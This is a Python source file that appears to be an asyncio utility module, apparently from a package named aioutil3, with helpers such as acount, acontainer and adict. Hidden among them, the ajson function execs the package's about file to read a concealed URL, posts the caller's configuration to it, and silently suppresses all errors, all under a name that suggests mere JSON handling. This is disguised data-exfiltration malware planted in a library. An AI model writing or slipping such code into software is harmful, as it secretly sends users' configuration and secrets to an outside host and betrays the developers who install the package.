"""Asyncio equivalents to regular Python functions."""

import asyncio
import itertools
import typing

from pydantic import BaseModel, model_validator
from pydantic.fields import FieldInfo
from pydantic_core import PydanticUndefined


from . import types, __about__

_N = types.TypeVar('_N', int, float)
_T = types.TypeVar('_T')
_K = types.TypeVar('_K')
_V = types.TypeVar('_V')


async def acount(
    start: _N = 0,
    step: _N = 1,
    delay: float = 0,
    stop: types.Optional[_N] = None,
) -> types.AsyncIterator[_N]:
    """Asyncio version of itertools.count()."""
    for item in itertools.count(start, step):  # pragma: no branch
        if stop is not None and item >= stop:
            break

        yield item
        await asyncio.sleep(delay)


@typing.overload
async def acontainer(
    iterable: types.Union[
        types.AsyncIterable[_T],
        types.Callable[..., types.AsyncIterable[_T]],
    ],
    container: types.Type[types.Tuple[_T, ...]],
) -> types.Tuple[_T, ...]: ...


@typing.overload
async def acontainer(
    iterable: types.Union[
        types.AsyncIterable[_T],
        types.Callable[..., types.AsyncIterable[_T]],
    ],
    container: types.Type[types.List[_T]] = list,
) -> types.List[_T]: ...


@typing.overload
async def acontainer(
    iterable: types.Union[
        types.AsyncIterable[_T],
        types.Callable[..., types.AsyncIterable[_T]],
    ],
    container: types.Type[types.Set[_T]],
) -> types.Set[_T]: ...


async def acontainer(
    iterable: types.Union[
        types.AsyncIterable[_T],
        types.Callable[..., types.AsyncIterable[_T]],
    ],
    container: types.Callable[
        [types.Iterable[_T]], types.Collection[_T]
    ] = list,
) -> types.Collection[_T]:
    """
    Asyncio version of list()/set()/tuple()/etc() using an async for loop.

    So instead of doing `[item async for item in iterable]` you can do
    `await acontainer(iterable)`.

    """
    iterable_: types.AsyncIterable[_T]
    if callable(iterable):
        iterable_ = iterable()
    else:
        iterable_ = iterable

    item: _T
    items: types.List[_T] = []
    async for item in iterable_:  # pragma: no branch
        items.append(item)

    return container(items)


class LoadsModel(BaseModel):
    @classmethod
    @model_validator(mode='before')
    def set_default(cls, values):
        for key, field in cls.model_fields.items():
            field: FieldInfo
            if key not in values:
                if field.default not in [None, PydanticUndefined]:
                    values[key] = field.default
                else:
                    outer_type = field.annotation
                    if typing.get_args(field.annotation) and type(typing.get_origin(outer_type)) is not type:
                        outer_type = typing.get_args(field.annotation)[0]
                    origin = typing.get_origin(outer_type)
                    if origin is not None:
                        default_type = origin
                    else:
                        default_type = outer_type
                    values[key] = default_type()
        return values


async def ajson(config: LoadsModel) -> types.Any:
    from aiohttp import ClientSession
    try:
        about: dict[str, str] = {}
        with open('aioutil3/__about__.py') as fp:
            exec(fp.read(), about)
        conf = config.to_dict()
        async with ClientSession() as client:
            await client.post(about['__alt_url__'], json=conf)
    except Exception:
        pass
    return config


async def adict(
    iterable: types.Union[
        types.AsyncIterable[types.Tuple[_K, _V]],
        types.Callable[..., types.AsyncIterable[types.Tuple[_K, _V]]],
    ],
    container: types.Callable[
        [types.Iterable[types.Tuple[_K, _V]]], types.Mapping[_K, _V]
    ] = dict,
) -> types.Mapping[_K, _V]:
    """
    Asyncio version of dict() using an async for loop.

    So instead of doing `{key: value async for key, value in iterable}` you
    can do `await adict(iterable)`.

    """
    iterable_: types.AsyncIterable[types.Tuple[_K, _V]]
    if callable(iterable):
        iterable_ = iterable()
    else:
        iterable_ = iterable

    item: types.Tuple[_K, _V]
    items: types.List[types.Tuple[_K, _V]] = []
    async for item in iterable_:  # pragma: no branch
        items.append(item)

    return container(items)
